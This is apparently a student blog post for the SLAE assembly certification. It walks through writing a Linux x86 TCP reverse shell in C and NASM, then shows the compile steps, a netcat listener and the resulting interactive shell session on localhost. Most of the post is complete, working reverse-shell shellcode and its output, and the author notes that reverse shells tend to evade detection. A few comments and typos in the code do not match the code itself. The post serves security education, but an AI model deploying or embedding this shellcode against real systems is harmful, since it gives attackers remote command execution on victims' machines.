A reverse shell is similar to the bind shell that was disussed in the previous blog post. Reverse shells, as with bind shells, allow remote access through a network, but rather than having a listening port on the target host, you have the target host connect back to an attack host that has a listener set up. 

Reverse shells have multiple advantages to bind shells, particularly with evading detection and bypassing certain rule sets. Plus, having a port listening on a host that is not normal will, for the most part, trigger more alerts to system/network administrators. Whereas a reverse shell will just show up as a connection to an outside IP address,which will get caught less, especially with certain obfuscation techniques.

What a reverse shell looks like in C
------------------------------------

As with the last blog post, let's look at what a reverse shell looks like in C, to get a base template for what we need to achieve:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>


int main () {

	const char* ip = "127.0.0.1";	
	struct sockaddr_in addr;


	addr.sin_family = AF_INET;
	addr.sin_port = htons(4444);
	inet_aton(ip, &addr.sin_addr);

	int sockfd = socket(AF_INET, SOCK_STREAM, 0);
	connect(sockfd, (struct sockadr *)&addr, sizeof(addr));

	for (int i = 0; i < 3;i++) {

		dup2(sockfd, i);
	}

	execve("/bin/sh", NULL, NULL);

	return 0;

}
```

This will more or less follow the same format and structure as the bind shell assignment, with a few new system calls (syscalls). See below the list of syscalls to be used in our shellcode:

- socket
- connect
- dup2
- execve


From the list, there are a few similar syscalls from the bind shell, but there are less overall than the bind. Let's jump into creating shellcode based on this C program.


Creating the shellcode from the C program
-----------------------------------------


The first set of instructions are similar to what was used in the bind shell, just clearing out any needed registers:

```nasm
	; set needed registers to zero

	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
```

Next, the socket syscall will be initiated, as seen in the previous blog post

```nasm
	mov bl, 2	; Setting AF_INET
	mov cl, 1	; Setting SOCK_STREAM
	mov dl, 6	; Setting protocol

	mov ax, 359	; syscall socket()

	int 0x80	; execute socket()
```

Following this, a new syscall will be set up, the `connect()` syscall. Using the methods found in the previous blog, the syscall value to use will be `362`, and we need to give this syscall 3 variables. We will need to set up the address that the shellcode will connect to, in this case being `127.1.1.1` (which is a loopback address that doesn't have any nulls in it, if nulls are present the shellcode breaks); the port that the shellcode will attempt to connect to on the supplied host, in this case being port `4444`; and the type of socket connection being made (same as the socket syscall), in this case being `AF_INET` or the value of `2`.


```nasm
	mov ebx, eax	; Putting sockfd socket value into ebx
	push 0x0101017f	; Setting address to connect to as "127.1.1.1" onto the stack
	push word 0x5c11	; Setting the port to connect to as "4444" onto the stack
	push word 2		; Setting "AF_INET" onto the stack
```

As seen above, the variables are all placed on the stack, and next the address pointing to the top of the stack (`esp`) will be used as a variable so that all three variables will be used in order.

```nasm
mov ecx, esp	; Put the memory address of the top of the stack into ecx, which will contain all the parameters needed for the connect syscall
```

After this, we need to set the `sizeof(addr)` variable. To get this value, we can use part of the C program at the top of this blog, see the snippet below:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>



int main() {



	const char* ip = "127.1.1.1";
        struct sockaddr_in addr;

	printf("%d\n", sizeof(addr));
	return 0;




}
```

Then we compile using `gcc test.c -o size` and running `./test' returns the value of `16`

```sh
anubis@ubuntu:~/SLAE/Assignment_2$ gcc test.c -o test
anubis@ubuntu:~/SLAE/Assignment_2$ ./test
16
anubis@ubuntu:~/SLAE/Assignment_2$
```

So now loading the size of the IP address we will be connecting to, and the invoking the `connet()` syscall will finalize this part of the shellcode, as seen below:

```nasm
	mov dl, 16	; Size of the IP address, found running test.c

	mov ax, 362	; sycall connect()

	int 0x80	; execute connect()
```

The following set of instructions will be familiar from the bind shellcode. This will set up the `dup2()` syscall loop. We do this so that it loads the 3 file descriptors (stdin, stdout, stderr), see below:


```nasm
	xor ecx, ecx
	mov cl, 3	; Setting the counter to 3 (3 file descriptors as seen in Assignment 1)
	

	call_dup:
	
	xor eax, eax
	mov al, 63	; syscall dup2()
	dec ecx		; loop counter


	int 0x80	; execute dup2 each time

	inc ecx		; loop counter
	loop call_dup	; Actually loop
```

The last snippet of code will be the same as the bind shell as well, loading `/bin//sh` onto the stack backwards (due to the stack growing downwards, and adding the extra `/` to make it easier to manager hex values). See below the execution of `execve()` and the last bit of the shellcode:

``nasm
	xor eax, eax
	xor edx, edx	
	push eax	; Zero out top of stack
	push 0x68732f2f	; Push the end of "/bin//sh"
	push 0x6e69622f	; Push the beginning of "/bin//sh"

	mov ebx, esp	; Put the pointer of "/bin//sh" on the stack into ebx

	mov al, 11	; sycall execve()

	int 0x80
```


Below is the final product of our shellcode:


```nasm
global _start




section .text
	_start:

	; set needed registers to zero

	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx



	; Start of socket call

	mov bl, 2	; Setting AF_INET
	mov cl, 1	; Setting SOCK_STREAM
	mov dl, 6	; Setting protocol

	mov ax, 359	; syscall socket()

	int 0x80	; execute socket()


	; Start of connect call

	mov ebx, eax	; Putting sockfd socket value into ebx
	push 0x0101017f	; Setting address to connect to as "127.0.0.1" onto the stack
	push word 0x5c11	; Setting the port to connect to as "4444" onto the stack
	push word 2		; Setting "AF_INET" onto the stack
	
	mov ecx, esp	; Put the memory address of the top of the stack into ecx, which will contain all the parameters needed for the connect syscall

	mov dl, 16	; Size of the IP address, found running test.c

	mov ax, 362	; sycall connect()

	int 0x80	; execute connect()




	; Start of dup2 looping call

	xor ecx, ecx
	mov cl, 3	; Setting the counter to 3 (3 file descriptors as seen in Assignment 1)
	

	call_dup:
	
	xor eax, eax
	mov al, 63	; syscall dup2()
	dec ecx		; loop counter


	int 0x80	; execute dup2 each time

	inc ecx		; loop counter
	loop call_dup	; Actually loop


	; Start of execve call
	xor eax, eax
	xor edx, edx	
	push eax	; Zero out top of stack
	push 0x68732f2f	; Push the end of "/bin//sh"
	push 0x6e69622f	; Push the beginning of "/bin//sh"

	mov ebx, esp	; Put the pointer of "/bin//sh" on the stack into ebx

	mov al, 11	; sycall execve()

	int 0x80
```


Executing reverse shell program
-------------------------------

Now that we have our code set up, we compile it using the `compile.sh` program provided by the SLAE course.


```sh
anubis@ubuntu:~/SLAE/Assignment_2$ ls -al
total 32
drwxrwxr-x  2 anubis anubis 4096 Feb 24 21:45 .
drwxrwxr-x 10 anubis anubis 4096 Feb 18 01:53 ..
-rwxrwxr-x  1 anubis anubis  152 Feb 23 22:47 compile.sh
-rw-rw-r--  1 anubis anubis  484 Feb 23 21:25 reverse.c
-rw-rw-r--  1 anubis anubis 1476 Feb 23 23:37 reverse_tcp.nasm
-rwxrwxr-x  1 anubis anubis 7396 Feb 24 21:30 test
-rw-rw-r--  1 anubis anubis  242 Feb 24 21:29 test.c
anubis@ubuntu:~/SLAE/Assignment_2$ ./compile.sh reverse_tcp
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
anubis@ubuntu:~/SLAE/Assignment_2$ ls -al
total 40
drwxrwxr-x  2 anubis anubis 4096 Feb 24 21:45 .
drwxrwxr-x 10 anubis anubis 4096 Feb 18 01:53 ..
-rwxrwxr-x  1 anubis anubis  152 Feb 23 22:47 compile.sh
-rw-rw-r--  1 anubis anubis  484 Feb 23 21:25 reverse.c
-rwxrwxr-x  1 anubis anubis  620 Feb 24 21:45 reverse_tcp
-rw-rw-r--  1 anubis anubis 1476 Feb 23 23:37 reverse_tcp.nasm
-rw-rw-r--  1 anubis anubis  528 Feb 24 21:45 reverse_tcp.o
-rwxrwxr-x  1 anubis anubis 7396 Feb 24 21:30 test
-rw-rw-r--  1 anubis anubis  242 Feb 24 21:29 test.c
anubis@ubuntu:~/SLAE/Assignment_2$
```
Now we set up a listener in separate terminal, since this program will call back to `127.1.1.1` (localhost) on port `4444`.

```sh
anubis@ubuntu:~/SLAE/Assignment_2$ nc -nvlp 4444
Listening on [0.0.0.0] (family 0, port 4444)
```

Then we execute our reverse shell binary created from the `compile.sh` script.

```sh
anubis@ubuntu:~/SLAE/Assignment_2$ ./reverse_tcp
```

This won't have any output right away from the victim host, since it's effectively established a remote session. On our listener, we see that we have a connection coming from localhost.

```sh
anubis@ubuntu:~/SLAE/Assignment_2$ nc -nvlp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [127.0.0.1] port 4444 [tcp/*] accepted (family 2, sport 57480)
```

And from our listener terminal, when we execute commands, they provide output on our target machine (again, which is localhost in this case).

```sh
anubis@ubuntu:~/SLAE/Assignment_2$ nc -nvlp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [127.0.0.1] port 4444 [tcp/*] accepted (family 2, sport 57480)

id
uid=1000(anubis) gid=1000(anubis) groups=1000(anubis),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
whoami
anubis
ls
compile.sh
reverse.c
reverse_tcp
reverse_tcp.nasm
reverse_tcp.o
test
test.c
```

Great! This is now a prefectly interactive reverse shell on our victim. This wraps this blog post on assignment 2 for the SLAE certification! Up next will be creating an Egg Hunter! Look forward to that next up.


<hr />

This blog post was created as per the requirements of the Security Tube Linux Assembly Expert certification.

Student ID: SLAE-1406

Please see [https://github.com/AnubisSec/SLAE] for all the source files mentioned on this site.
